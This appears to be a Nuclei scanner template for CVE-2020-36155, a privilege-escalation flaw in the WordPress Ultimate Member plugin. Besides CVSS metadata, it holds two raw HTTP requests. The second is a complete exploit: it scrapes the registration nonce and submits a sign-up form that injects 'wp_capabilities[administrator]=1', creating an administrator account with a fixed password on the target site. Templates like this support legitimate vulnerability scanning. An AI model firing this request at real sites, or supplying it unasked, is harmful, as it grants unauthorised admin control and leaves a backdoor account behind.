id: CVE-2020-36155

info:
  name: WordPress - Unauthenticated Privilege Escalation
  author: riteshs4hu
  severity: critical
  description: |
    Ultimate Member plugin allowed attackers to escalate privileges during registration by injecting arbitrary user meta, including wp_capabilities.
  reference:
    - https://wpscan.com/vulnerability/cf13b0f8-5815-4d27-a276-5eff8985fc0b/
    - https://nvd.nist.gov/vuln/detail/CVE-2020-36155
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10.0
    cve-id: CVE-2020-36155
    cwe-id: CWE-269
  metadata:
    max-request: 2
  tags: cve,cve2020,wp

variables:
  user: demo
  email1: demo@example.com
  pass1: "DemoPass123!"  
  form_id: "29"

requests:
  - raw:
      - |
        GET /register/ HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Nuclei-Scanner
        Accept: text/html
        Connection: close
        Accept-Encoding: gzip

      - |
        POST /register/ HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Nuclei-Scanner
        Connection: close
        Content-Type: application/x-www-form-urlencoded
        Accept-Encoding: gzip

        user_login-29={{user}}&first_name-29={{user}}&last_name-29={{user}}&user_email-29={{email1}}&user_password-29={{pass1}}&confirm_user_password-29={{pass1}}&form_id={{form_id}}&timestamp=111&um_request=&_wpnonce={{_wpnonce}}&_wp_http_referer=%2Fwordpress%2Fregister%2F&wp_capabilities[administrator]=1
    
    extractors:
      - type: regex
        name: _wpnonce
        internal: true
        part: body
        group: 1
        regex:
          - 'name="_wpnonce"\s+value="([^"]+)"'
          - "name='_wpnonce'\\s+value='([^']+)'"

    matchers:
      - type: status
        status:
          - 302
